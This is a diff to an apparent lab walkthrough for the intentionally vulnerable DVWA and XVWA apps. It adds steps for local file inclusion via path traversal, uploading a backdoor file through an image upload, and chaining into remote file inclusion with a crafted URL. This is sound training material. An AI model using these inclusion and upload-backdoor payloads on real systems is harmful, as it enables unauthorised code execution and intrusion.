@@ -139,10 +139,20 @@ but we want more!
 `http://dvwa.lab/vulnerabilities/fi/?page=../../phpinfo.php`
 
 
-Or you can upload your own backdoor using the [image upload](http://dvwa.lab/vulnerabilities/upload) and then access it 
+Or you can upload your own backdoor using the [image upload](http://dvwa.lab/vulnerabilities/upload) to
 
 `../../hackable/uploads/phpinfo.txt`
 
+and then access it as
+
+`http://dvwa.lab/hackable/uploads/phpinfo.txt`
+
+
+So let's turn LFI into RFI
+
+`http://xvwa.lab/xvwa/vulnerabilities/fi/?file=http://DVWA/hackable/uploads/phpinfo.txt`
+
+Use the `DVWA` hostname instead of `dvwa.lab` because of the docker setup.
 
 
 ## Injection
